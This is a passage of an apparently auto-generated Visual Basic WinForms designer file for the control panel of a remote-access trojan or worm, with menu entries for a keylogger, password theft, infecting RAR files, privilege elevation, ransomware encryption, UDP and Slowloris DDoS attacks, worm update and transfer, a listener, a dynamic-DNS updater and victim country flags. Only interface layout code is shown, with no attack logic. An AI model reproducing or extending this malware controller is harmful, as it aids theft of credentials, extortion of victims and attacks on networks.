        '
        Me.StartupManagerToolStripMenuItem.Image = CType(resources.GetObject("StartupManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StartupManagerToolStripMenuItem.Name = "StartupManagerToolStripMenuItem"
        Me.StartupManagerToolStripMenuItem.Size = New System.Drawing.Size(179, 22)
        Me.StartupManagerToolStripMenuItem.Text = "Startup Manager"
        '
        'KeyloggerToolStripMenuItem1
        '
        Me.KeyloggerToolStripMenuItem1.Image = CType(resources.GetObject("KeyloggerToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1"
        Me.KeyloggerToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.KeyloggerToolStripMenuItem1.Text = "Keylogger"
        '
        'PluginsToolStripMenuItem
        '
        Me.PluginsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GetPasswordToolStripMenuItem, Me.InfectToolStripMenuItem, Me.CoustomPluginToolStripMenuItem})
        Me.PluginsToolStripMenuItem.Image = CType(resources.GetObject("PluginsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PluginsToolStripMenuItem.Name = "PluginsToolStripMenuItem"
        Me.PluginsToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.PluginsToolStripMenuItem.Text = "Plugins"
        '
        'GetPasswordToolStripMenuItem
        '
        Me.GetPasswordToolStripMenuItem.Image = CType(resources.GetObject("GetPasswordToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GetPasswordToolStripMenuItem.Name = "GetPasswordToolStripMenuItem"
        Me.GetPasswordToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.GetPasswordToolStripMenuItem.Text = "Get Password"
        '
        'InfectToolStripMenuItem
        '
        Me.InfectToolStripMenuItem.Image = CType(resources.GetObject("InfectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.InfectToolStripMenuItem.Name = "InfectToolStripMenuItem"
        Me.InfectToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.InfectToolStripMenuItem.Text = "Infect RAR Files"
        '
        'CoustomPluginToolStripMenuItem
        '
        Me.CoustomPluginToolStripMenuItem.Image = CType(resources.GetObject("CoustomPluginToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CoustomPluginToolStripMenuItem.Name = "CoustomPluginToolStripMenuItem"
        Me.CoustomPluginToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.CoustomPluginToolStripMenuItem.Text = "Custom Plugin"
        '
        'ExecuteScriptToolStripMenuItem
        '
        Me.ExecuteScriptToolStripMenuItem.Image = CType(resources.GetObject("ExecuteScriptToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ExecuteScriptToolStripMenuItem.Name = "ExecuteScriptToolStripMenuItem"
        Me.ExecuteScriptToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.ExecuteScriptToolStripMenuItem.Text = "Execute Script"
        '
        'ElevetePrivlageToolStripMenuItem
        '
        Me.ElevetePrivlageToolStripMenuItem.Image = CType(resources.GetObject("ElevetePrivlageToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ElevetePrivlageToolStripMenuItem.Name = "ElevetePrivlageToolStripMenuItem"
        Me.ElevetePrivlageToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.ElevetePrivlageToolStripMenuItem.Text = "Elevate Privileges"
        '
        'RansomwareToolStripMenuItem
        '
        Me.RansomwareToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EncryptToolStripMenuItem, Me.DecryptToolStripMenuItem})
        Me.RansomwareToolStripMenuItem.Image = CType(resources.GetObject("RansomwareToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem"
        Me.RansomwareToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.RansomwareToolStripMenuItem.Text = "Ransomware"
        '
        'EncryptToolStripMenuItem
        '
        Me.EncryptToolStripMenuItem.Image = CType(resources.GetObject("EncryptToolStripMenuItem.Image"), System.Drawing.Image)
        Me.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem"
        Me.EncryptToolStripMenuItem.Size = New System.Drawing.Size(115, 22)
        Me.EncryptToolStripMenuItem.Text = "Encrypt"
        '
        'DecryptToolStripMenuItem
        '
        Me.DecryptToolStripMenuItem.Image = CType(resources.GetObject("DecryptToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem"
        Me.DecryptToolStripMenuItem.Size = New System.Drawing.Size(115, 22)
        Me.DecryptToolStripMenuItem.Text = "Decrypt"
        '
        'BlockWebSiteToolStripMenuItem
        '
        Me.BlockWebSiteToolStripMenuItem.Image = CType(resources.GetObject("BlockWebSiteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.BlockWebSiteToolStripMenuItem.Name = "BlockWebSiteToolStripMenuItem"
        Me.BlockWebSiteToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.BlockWebSiteToolStripMenuItem.Text = "Block WebSite"
        '
        'OpenWebSiteToolStripMenuItem
        '
        Me.OpenWebSiteToolStripMenuItem.Image = CType(resources.GetObject("OpenWebSiteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenWebSiteToolStripMenuItem.Name = "OpenWebSiteToolStripMenuItem"
        Me.OpenWebSiteToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.OpenWebSiteToolStripMenuItem.Text = "Open WebSite"
        '
        'DDOSAttackToolStripMenuItem1
        '
        Me.DDOSAttackToolStripMenuItem1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UDPAttackToolStripMenuItem, Me.SlowlorisAttackToolStripMenuItem})
        Me.DDOSAttackToolStripMenuItem1.Image = CType(resources.GetObject("DDOSAttackToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.DDOSAttackToolStripMenuItem1.Name = "DDOSAttackToolStripMenuItem1"
        Me.DDOSAttackToolStripMenuItem1.Size = New System.Drawing.Size(164, 22)
        Me.DDOSAttackToolStripMenuItem1.Text = "DDOS Attack"
        '
        'UDPAttackToolStripMenuItem
        '
        Me.UDPAttackToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem2, Me.StopToolStripMenuItem1})
        Me.UDPAttackToolStripMenuItem.Image = CType(resources.GetObject("UDPAttackToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UDPAttackToolStripMenuItem.Name = "UDPAttackToolStripMenuItem"
        Me.UDPAttackToolStripMenuItem.Size = New System.Drawing.Size(158, 22)
        Me.UDPAttackToolStripMenuItem.Text = "UDP Attack"
        '
        'StartToolStripMenuItem2
        '
        Me.StartToolStripMenuItem2.Image = CType(resources.GetObject("StartToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.StartToolStripMenuItem2.Name = "StartToolStripMenuItem2"
        Me.StartToolStripMenuItem2.Size = New System.Drawing.Size(98, 22)
        Me.StartToolStripMenuItem2.Text = "Start"
        '
        'StopToolStripMenuItem1
        '
        Me.StopToolStripMenuItem1.Image = CType(resources.GetObject("StopToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1"
        Me.StopToolStripMenuItem1.Size = New System.Drawing.Size(98, 22)
        Me.StopToolStripMenuItem1.Text = "Stop"
        '
        'SlowlorisAttackToolStripMenuItem
        '
        Me.SlowlorisAttackToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem1, Me.StopToolStripMenuItem})
        Me.SlowlorisAttackToolStripMenuItem.Image = CType(resources.GetObject("SlowlorisAttackToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SlowlorisAttackToolStripMenuItem.Name = "SlowlorisAttackToolStripMenuItem"
        Me.SlowlorisAttackToolStripMenuItem.Size = New System.Drawing.Size(158, 22)
        Me.SlowlorisAttackToolStripMenuItem.Text = "Slowloris Attack"
        '
        'StartToolStripMenuItem1
        '
        Me.StartToolStripMenuItem1.Image = CType(resources.GetObject("StartToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1"
        Me.StartToolStripMenuItem1.Size = New System.Drawing.Size(98, 22)
        Me.StartToolStripMenuItem1.Text = "Start"
        '
        'StopToolStripMenuItem
        '
        Me.StopToolStripMenuItem.Image = CType(resources.GetObject("StopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
        Me.StopToolStripMenuItem.Size = New System.Drawing.Size(98, 22)
        Me.StopToolStripMenuItem.Text = "Stop"
        '
        'ComputerToolStripMenuItem
        '
        Me.ComputerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogoffToolStripMenuItem, Me.ToolStripMenuItem3, Me.ShutdownToolStripMenuItem})
        Me.ComputerToolStripMenuItem.Image = CType(resources.GetObject("ComputerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem"
        Me.ComputerToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.ComputerToolStripMenuItem.Text = "Computer"
        '
        'LogoffToolStripMenuItem
        '
        Me.LogoffToolStripMenuItem.Image = CType(resources.GetObject("LogoffToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem"
        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.LogoffToolStripMenuItem.Text = "Logoff"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.Image = CType(resources.GetObject("ToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(128, 22)
        Me.ToolStripMenuItem3.Text = "Restart"
        '
        'ShutdownToolStripMenuItem
        '
        Me.ShutdownToolStripMenuItem.Image = CType(resources.GetObject("ShutdownToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.ShutdownToolStripMenuItem.Text = "Shutdown"
        '
        'GroupsSettingsToolStripMenuItem
        '
        Me.GroupsSettingsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.AddToGroupToolStripMenuItem, Me.RemoveFromGroupToolStripMenuItem})
        Me.GroupsSettingsToolStripMenuItem.Image = CType(resources.GetObject("GroupsSettingsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupsSettingsToolStripMenuItem.Name = "GroupsSettingsToolStripMenuItem"
        Me.GroupsSettingsToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.GroupsSettingsToolStripMenuItem.Text = "Groups Settings"
        '
        'AddToGroupToolStripMenuItem
        '
        Me.AddToGroupToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem2, Me.MultiToolStripMenuItem})
        Me.AddToGroupToolStripMenuItem.Image = CType(resources.GetObject("AddToGroupToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AddToGroupToolStripMenuItem.Name = "AddToGroupToolStripMenuItem"
        Me.AddToGroupToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.AddToGroupToolStripMenuItem.Text = "Add To Group"
        '
        'ToolStripMenuItem2
        '
        Me.ToolStripMenuItem2.Image = CType(resources.GetObject("ToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(133, 22)
        Me.ToolStripMenuItem2.Text = "Single User"
        '
        'MultiToolStripMenuItem
        '
        Me.MultiToolStripMenuItem.Image = CType(resources.GetObject("MultiToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MultiToolStripMenuItem.Name = "MultiToolStripMenuItem"
        Me.MultiToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.MultiToolStripMenuItem.Text = "Multi Users"
        '
        'RemoveFromGroupToolStripMenuItem
        '
        Me.RemoveFromGroupToolStripMenuItem.Image = CType(resources.GetObject("RemoveFromGroupToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoveFromGroupToolStripMenuItem.Name = "RemoveFromGroupToolStripMenuItem"
        Me.RemoveFromGroupToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.RemoveFromGroupToolStripMenuItem.Text = "Remove From Group"
        '
        'WormSettingToolStripMenuItem
        '
        Me.WormSettingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem1, Me.TransferToolStripMenuItem, Me.UninstallToolStripMenuItem1, Me.CloseToolStripMenuItem})
        Me.WormSettingToolStripMenuItem.Image = CType(resources.GetObject("WormSettingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WormSettingToolStripMenuItem.Name = "WormSettingToolStripMenuItem"
        Me.WormSettingToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.WormSettingToolStripMenuItem.Text = "Worm Setting"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.Image = CType(resources.GetObject("UpdateToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'RestartToolStripMenuItem1
        '
        Me.RestartToolStripMenuItem1.Image = CType(resources.GetObject("RestartToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
        Me.RestartToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.RestartToolStripMenuItem1.Text = "Restart"
        '
        'TransferToolStripMenuItem
        '
        Me.TransferToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SingleTransferToolStripMenuItem, Me.MultiTransferToolStripMenuItem})
        Me.TransferToolStripMenuItem.Image = CType(resources.GetObject("TransferToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TransferToolStripMenuItem.Name = "TransferToolStripMenuItem"
        Me.TransferToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.TransferToolStripMenuItem.Text = "Transfer"
        '
        'SingleTransferToolStripMenuItem
        '
        Me.SingleTransferToolStripMenuItem.Image = CType(resources.GetObject("SingleTransferToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SingleTransferToolStripMenuItem.Name = "SingleTransferToolStripMenuItem"
        Me.SingleTransferToolStripMenuItem.Size = New System.Drawing.Size(151, 22)
        Me.SingleTransferToolStripMenuItem.Text = "Single Transfer"
        '
        'MultiTransferToolStripMenuItem
        '
        Me.MultiTransferToolStripMenuItem.Image = CType(resources.GetObject("MultiTransferToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MultiTransferToolStripMenuItem.Name = "MultiTransferToolStripMenuItem"
        Me.MultiTransferToolStripMenuItem.Size = New System.Drawing.Size(151, 22)
        Me.MultiTransferToolStripMenuItem.Text = "Multi Transfer"
        '
        'UninstallToolStripMenuItem1
        '
        Me.UninstallToolStripMenuItem1.Image = CType(resources.GetObject("UninstallToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1"
        Me.UninstallToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.UninstallToolStripMenuItem1.Text = "Uninstall"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'MenuStrip1
        '
        Me.MenuStrip1.BackColor = System.Drawing.SystemColors.ButtonHighlight
        Me.MenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem, Me.SendPugToolStripMenuItem, Me.PluginManagerToolStripMenuItem})
        Me.MenuStrip1.Location = New System.Drawing.Point(0, 0)
        Me.MenuStrip1.Name = "MenuStrip1"
        Me.MenuStrip1.Size = New System.Drawing.Size(798, 24)
        Me.MenuStrip1.TabIndex = 5
        Me.MenuStrip1.Text = "MenuStrip1"
        '
        'StartToolStripMenuItem
        '
        Me.StartToolStripMenuItem.Image = CType(resources.GetObject("StartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
        Me.StartToolStripMenuItem.Size = New System.Drawing.Size(111, 20)
        Me.StartToolStripMenuItem.Text = "[ Start Listner ]"
        '
        'SendPugToolStripMenuItem
        '
        Me.SendPugToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.NoIPToolStripMenuItem, Me.DNSDynmicToolStripMenuItem})
        Me.SendPugToolStripMenuItem.Image = CType(resources.GetObject("SendPugToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SendPugToolStripMenuItem.Name = "SendPugToolStripMenuItem"
        Me.SendPugToolStripMenuItem.Size = New System.Drawing.Size(117, 20)
        Me.SendPugToolStripMenuItem.Text = "[ DNS Updater ]"
        '
        'NoIPToolStripMenuItem
        '
        Me.NoIPToolStripMenuItem.Image = CType(resources.GetObject("NoIPToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NoIPToolStripMenuItem.Name = "NoIPToolStripMenuItem"
        Me.NoIPToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.NoIPToolStripMenuItem.Text = "No-IP"
        '
        'DNSDynmicToolStripMenuItem
        '
        Me.DNSDynmicToolStripMenuItem.Image = CType(resources.GetObject("DNSDynmicToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DNSDynmicToolStripMenuItem.Name = "DNSDynmicToolStripMenuItem"
        Me.DNSDynmicToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.DNSDynmicToolStripMenuItem.Text = "Dynu.com"
        '
        'PluginManagerToolStripMenuItem
        '
        Me.PluginManagerToolStripMenuItem.Image = CType(resources.GetObject("PluginManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PluginManagerToolStripMenuItem.Name = "PluginManagerToolStripMenuItem"
        Me.PluginManagerToolStripMenuItem.Size = New System.Drawing.Size(133, 20)
        Me.PluginManagerToolStripMenuItem.Text = "[ Plugin Manager ]"
        '
        'IMG2
        '
        Me.IMG2.ImageStream = CType(resources.GetObject("IMG2.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IMG2.TransparentColor = System.Drawing.Color.Transparent
        Me.IMG2.Images.SetKeyName(0, "ABW.png")
        Me.IMG2.Images.SetKeyName(1, "AFG.png")
        Me.IMG2.Images.SetKeyName(2, "AGO.png")
        Me.IMG2.Images.SetKeyName(3, "AIA.png")
        Me.IMG2.Images.SetKeyName(4, "ALB.png")
        Me.IMG2.Images.SetKeyName(5, "AND.png")
        Me.IMG2.Images.SetKeyName(6, "ARE.png")
        Me.IMG2.Images.SetKeyName(7, "ARG.png")
        Me.IMG2.Images.SetKeyName(8, "ARM.png")
        Me.IMG2.Images.SetKeyName(9, "ASM.png")
        Me.IMG2.Images.SetKeyName(10, "ATF.png")
        Me.IMG2.Images.SetKeyName(11, "ATG.png")
        Me.IMG2.Images.SetKeyName(12, "AUS.png")
        Me.IMG2.Images.SetKeyName(13, "AUT.png")
        Me.IMG2.Images.SetKeyName(14, "ax.png")
        Me.IMG2.Images.SetKeyName(15, "AZE.png")
        Me.IMG2.Images.SetKeyName(16, "BDI.png")
        Me.IMG2.Images.SetKeyName(17, "BEL.png")
        Me.IMG2.Images.SetKeyName(18, "BEN.png")
        Me.IMG2.Images.SetKeyName(19, "BFA.png")
        Me.IMG2.Images.SetKeyName(20, "BGD.png")
        Me.IMG2.Images.SetKeyName(21, "BGR.png")
        Me.IMG2.Images.SetKeyName(22, "BHR.png")
        Me.IMG2.Images.SetKeyName(23, "BHS.png")
        Me.IMG2.Images.SetKeyName(24, "BIH.png")
        Me.IMG2.Images.SetKeyName(25, "BLR.png")
        Me.IMG2.Images.SetKeyName(26, "BLZ.png")
        Me.IMG2.Images.SetKeyName(27, "BMU.png")
        Me.IMG2.Images.SetKeyName(28, "BOL.png")
        Me.IMG2.Images.SetKeyName(29, "BRA.png")
        Me.IMG2.Images.SetKeyName(30, "BRB.png")
        Me.IMG2.Images.SetKeyName(31, "BRN.png")
        Me.IMG2.Images.SetKeyName(32, "BTN.png")
        Me.IMG2.Images.SetKeyName(33, "BVT.png")
        Me.IMG2.Images.SetKeyName(34, "BWA.png")
        Me.IMG2.Images.SetKeyName(35, "CAF.png")
        Me.IMG2.Images.SetKeyName(36, "CAN.png")
        Me.IMG2.Images.SetKeyName(37, "CCK.png")
        Me.IMG2.Images.SetKeyName(38, "CHE.png")
        Me.IMG2.Images.SetKeyName(39, "CHL.png")
        Me.IMG2.Images.SetKeyName(40, "CHN.png")
        Me.IMG2.Images.SetKeyName(41, "CIV.png")
        Me.IMG2.Images.SetKeyName(42, "CMR.png")
        Me.IMG2.Images.SetKeyName(43, "COD.png")
        Me.IMG2.Images.SetKeyName(44, "COG.png")
        Me.IMG2.Images.SetKeyName(45, "COK.png")
        Me.IMG2.Images.SetKeyName(46, "COL.png")
        Me.IMG2.Images.SetKeyName(47, "COM.png")
        Me.IMG2.Images.SetKeyName(48, "CPV.png")
        Me.IMG2.Images.SetKeyName(49, "CRI.png")
        Me.IMG2.Images.SetKeyName(50, "cs.png")
        Me.IMG2.Images.SetKeyName(51, "CUB.png")
        Me.IMG2.Images.SetKeyName(52, "CXR.png")
        Me.IMG2.Images.SetKeyName(53, "CYM.png")
        Me.IMG2.Images.SetKeyName(54, "CYP.png")
        Me.IMG2.Images.SetKeyName(55, "CZE.png")
        Me.IMG2.Images.SetKeyName(56, "DEU.png")
        Me.IMG2.Images.SetKeyName(57, "DJI.png")
        Me.IMG2.Images.SetKeyName(58, "DMA.png")
        Me.IMG2.Images.SetKeyName(59, "DNK.png")
        Me.IMG2.Images.SetKeyName(60, "DOM.png")
        Me.IMG2.Images.SetKeyName(61, "DZA.png")
        Me.IMG2.Images.SetKeyName(62, "ECU.png")
        Me.IMG2.Images.SetKeyName(63, "EGY.png")
        Me.IMG2.Images.SetKeyName(64, "ERI.png")
        Me.IMG2.Images.SetKeyName(65, "ESH.png")
        Me.IMG2.Images.SetKeyName(66, "ESP.png")
        Me.IMG2.Images.SetKeyName(67, "EST.png")
        Me.IMG2.Images.SetKeyName(68, "ETH.png")
        Me.IMG2.Images.SetKeyName(69, "FIN.png")
        Me.IMG2.Images.SetKeyName(70, "FJI.png")
        Me.IMG2.Images.SetKeyName(71, "FLK.png")
        Me.IMG2.Images.SetKeyName(72, "FRA.png")
        Me.IMG2.Images.SetKeyName(73, "FRO.png")
        Me.IMG2.Images.SetKeyName(74, "FSM.png")
        Me.IMG2.Images.SetKeyName(75, "GAB.png")
        Me.IMG2.Images.SetKeyName(76, "GBR.png")
        Me.IMG2.Images.SetKeyName(77, "GEO.png")
        Me.IMG2.Images.SetKeyName(78, "GHA.png")
        Me.IMG2.Images.SetKeyName(79, "GIB.png")
        Me.IMG2.Images.SetKeyName(80, "GIN.png")
        Me.IMG2.Images.SetKeyName(81, "GLP.png")
        Me.IMG2.Images.SetKeyName(82, "GMB.png")
        Me.IMG2.Images.SetKeyName(83, "GNB.png")
        Me.IMG2.Images.SetKeyName(84, "GNQ.png")
        Me.IMG2.Images.SetKeyName(85, "GRC.png")
        Me.IMG2.Images.SetKeyName(86, "GRD.png")
        Me.IMG2.Images.SetKeyName(87, "GRL.png")
        Me.IMG2.Images.SetKeyName(88, "GTM.png")
        Me.IMG2.Images.SetKeyName(89, "GUF.png")
        Me.IMG2.Images.SetKeyName(90, "GUM.png")
        Me.IMG2.Images.SetKeyName(91, "GUY.png")
        Me.IMG2.Images.SetKeyName(92, "HKG.png")
        Me.IMG2.Images.SetKeyName(93, "HMD.png")
        Me.IMG2.Images.SetKeyName(94, "HND.png")
        Me.IMG2.Images.SetKeyName(95, "HRV.png")
        Me.IMG2.Images.SetKeyName(96, "HTI.png")
        Me.IMG2.Images.SetKeyName(97, "HUN.png")
        Me.IMG2.Images.SetKeyName(98, "IDN.png")
        Me.IMG2.Images.SetKeyName(99, "IND.png")
        Me.IMG2.Images.SetKeyName(100, "IOT.png")
        Me.IMG2.Images.SetKeyName(101, "IRL.png")
        Me.IMG2.Images.SetKeyName(102, "IRN.png")
        Me.IMG2.Images.SetKeyName(103, "IRQ.png")
        Me.IMG2.Images.SetKeyName(104, "ISL.png")
        Me.IMG2.Images.SetKeyName(105, "ISR.png")
        Me.IMG2.Images.SetKeyName(106, "ITA.png")
        Me.IMG2.Images.SetKeyName(107, "JAM.png")
        Me.IMG2.Images.SetKeyName(108, "JOR.png")
        Me.IMG2.Images.SetKeyName(109, "JPN.png")
        Me.IMG2.Images.SetKeyName(110, "KAZ.png")
        Me.IMG2.Images.SetKeyName(111, "KEN.png")
        Me.IMG2.Images.SetKeyName(112, "KGZ.png")
        Me.IMG2.Images.SetKeyName(113, "KHM.png")
        Me.IMG2.Images.SetKeyName(114, "KIR.png")
        Me.IMG2.Images.SetKeyName(115, "KNA.png")
        Me.IMG2.Images.SetKeyName(116, "KOR.png")
        Me.IMG2.Images.SetKeyName(117, "KWT.png")
        Me.IMG2.Images.SetKeyName(118, "LAO.png")
        Me.IMG2.Images.SetKeyName(119, "LBN.png")
        Me.IMG2.Images.SetKeyName(120, "LBR.png")
        Me.IMG2.Images.SetKeyName(121, "LBY.png")
        Me.IMG2.Images.SetKeyName(122, "LCA.png")
        Me.IMG2.Images.SetKeyName(123, "LIE.png")
        Me.IMG2.Images.SetKeyName(124, "LKA.png")
        Me.IMG2.Images.SetKeyName(125, "LSO.png")
        Me.IMG2.Images.SetKeyName(126, "LTU.png")
        Me.IMG2.Images.SetKeyName(127, "LUX.png")
        Me.IMG2.Images.SetKeyName(128, "LVA.png")
        Me.IMG2.Images.SetKeyName(129, "MAC.png")
        Me.IMG2.Images.SetKeyName(130, "MAR.png")
        Me.IMG2.Images.SetKeyName(131, "MCO.png")
        Me.IMG2.Images.SetKeyName(132, "MDA.png")
        Me.IMG2.Images.SetKeyName(133, "MDG.png")
        Me.IMG2.Images.SetKeyName(134, "MDV.png")
        Me.IMG2.Images.SetKeyName(135, "MEX.png")
        Me.IMG2.Images.SetKeyName(136, "MHL.png")
        Me.IMG2.Images.SetKeyName(137, "MKD.png")
        Me.IMG2.Images.SetKeyName(138, "MLI.png")
        Me.IMG2.Images.SetKeyName(139, "MLT.png")
        Me.IMG2.Images.SetKeyName(140, "MMR.png")
        Me.IMG2.Images.SetKeyName(141, "MNE.png")
        Me.IMG2.Images.SetKeyName(142, "MNG.png")
        Me.IMG2.Images.SetKeyName(143, "MNP.png")
        Me.IMG2.Images.SetKeyName(144, "MOZ.png")
        Me.IMG2.Images.SetKeyName(145, "MRT.png")
        Me.IMG2.Images.SetKeyName(146, "MSR.png")
        Me.IMG2.Images.SetKeyName(147, "MSY.png")
        Me.IMG2.Images.SetKeyName(148, "MTQ.png")
        Me.IMG2.Images.SetKeyName(149, "MUS.png")
        Me.IMG2.Images.SetKeyName(150, "MWI.png")
        Me.IMG2.Images.SetKeyName(151, "MYT.png")
        Me.IMG2.Images.SetKeyName(152, "NAM.png")
        Me.IMG2.Images.SetKeyName(153, "NCL.png")
        Me.IMG2.Images.SetKeyName(154, "NER.png")
        Me.IMG2.Images.SetKeyName(155, "NFK.png")
        Me.IMG2.Images.SetKeyName(156, "NGA.png")
        Me.IMG2.Images.SetKeyName(157, "NIC.png")
        Me.IMG2.Images.SetKeyName(158, "NIU.png")
        Me.IMG2.Images.SetKeyName(159, "NLD.png")
        Me.IMG2.Images.SetKeyName(160, "NOR.png")
        Me.IMG2.Images.SetKeyName(161, "NPL.png")
        Me.IMG2.Images.SetKeyName(162, "NRU.png")
        Me.IMG2.Images.SetKeyName(163, "NZL.png")
        Me.IMG2.Images.SetKeyName(164, "OMN.png")
        Me.IMG2.Images.SetKeyName(165, "PAK.png")
        Me.IMG2.Images.SetKeyName(166, "PAN.png")
        Me.IMG2.Images.SetKeyName(167, "PCN.png")
        Me.IMG2.Images.SetKeyName(168, "PER.png")
        Me.IMG2.Images.SetKeyName(169, "PHL.png")
        Me.IMG2.Images.SetKeyName(170, "PLW.png")
        Me.IMG2.Images.SetKeyName(171, "PNG.png")
        Me.IMG2.Images.SetKeyName(172, "POL.png")
        Me.IMG2.Images.SetKeyName(173, "PRI.png")
        Me.IMG2.Images.SetKeyName(174, "PRK.png")
        Me.IMG2.Images.SetKeyName(175, "PRT.png")
        Me.IMG2.Images.SetKeyName(176, "PRY.png")
        Me.IMG2.Images.SetKeyName(177, "PSE.png")
        Me.IMG2.Images.SetKeyName(178, "PYF.png")
        Me.IMG2.Images.SetKeyName(179, "QAT.png")
        Me.IMG2.Images.SetKeyName(180, "REU.png")
        Me.IMG2.Images.SetKeyName(181, "ROM.png")
        Me.IMG2.Images.SetKeyName(182, "RUS.png")
        Me.IMG2.Images.SetKeyName(183, "RWA.png")
        Me.IMG2.Images.SetKeyName(184, "SAU.png")
        Me.IMG2.Images.SetKeyName(185, "scotland.png")
